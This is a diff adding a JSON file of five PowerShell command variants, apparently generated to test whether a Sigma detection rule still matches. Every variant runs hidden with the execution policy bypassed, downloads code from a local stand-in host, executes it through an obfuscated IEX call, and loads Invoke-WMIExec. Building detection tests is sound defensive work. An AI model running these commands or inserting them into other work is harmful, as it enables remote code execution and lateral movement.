@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:1337/'|%{IRM $_});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command uses the same structure as the original, but replaces ForEach-Object with the % alias and maintains the same logic. It matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:1337/'|ForEach-Object{IRM $_});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command uses the full name of ForEach-Object instead of the % alias and maintains the same logic. It matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:1337/'|ForEach-Object{Invoke-RestMethod $_});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command uses the full name of Invoke-RestMethod instead of the IRM alias and maintains the same logic. It matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:1337/'|ForEach-Object{Invoke-RestMethod $_});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command uses the full path to the module file and maintains the same logic. It matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:1337/'|ForEach-Object{Invoke-RestMethod $_});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module $env:TEMP\\Invoke-WMIExec.ps1; Invoke-WMIExec\"",
+    "explanation": "This command uses an environment variable to represent the path to the module file and maintains the same logic. It matches the Sigma rule's detection criteria."
+  }
+]
